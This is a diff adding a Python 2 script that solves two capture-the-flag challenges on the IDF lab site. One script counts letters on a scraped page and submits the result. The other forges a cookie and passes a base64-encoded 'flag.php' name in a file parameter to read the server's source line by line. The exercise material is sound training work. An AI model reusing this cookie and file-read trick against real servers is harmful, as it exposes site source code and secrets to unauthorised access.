@@ -1,0 +1,46 @@
+##################################################################
+# IDF实验室
+# 简单编程-字符统计
+# 这里这里 → http://ctf.idf.cn/game/pro/37
+##################################################################
+
+#!/usr/bin/python
+# coding: utf-8
+import requests
+url = 'http://ctf.idf.cn/game/pro/37/'
+s = requests.session()  # 模拟登录,就不要用cookie了,直接get post
+res = s.get(url)
+test = res.text.split('<hr /')  #扒下网站,相当于wget;若浏览网页,F12 或 ctrl+u
+#  print test
+w, o, l, d, y = 0, 0, 0, 0, 0
+for ch in test[1]:
+    if ch == 'w':
+        w += 1
+    elif ch == 'o':
+        o += 1
+    elif ch == 'l':
+        l += 1
+    elif ch == 'd':
+        d += 1
+    elif ch == 'y':
+        y += 1
+anwser = '%d%d%d%d%d' % (w, o, l, d, y)
+values = {'anwser': anwser}
+print type(values)
+result = s.post(url, values)
+print result.text
+
+
+##################################################################
+# 添加cookies
+##################################################################
+
+import requests
+
+cookies = {'key': 'idf'}  # 设置cookies的值为idf
+
+for i in range(0, 19):
+        url = "http://ctf.idf.cn/game/web/40/index.php?line="+str(i) + "&file=ZmxhZy5waHA="
+        response = requests.get(url, cookies=cookies)
+        content = response.text
+        print content
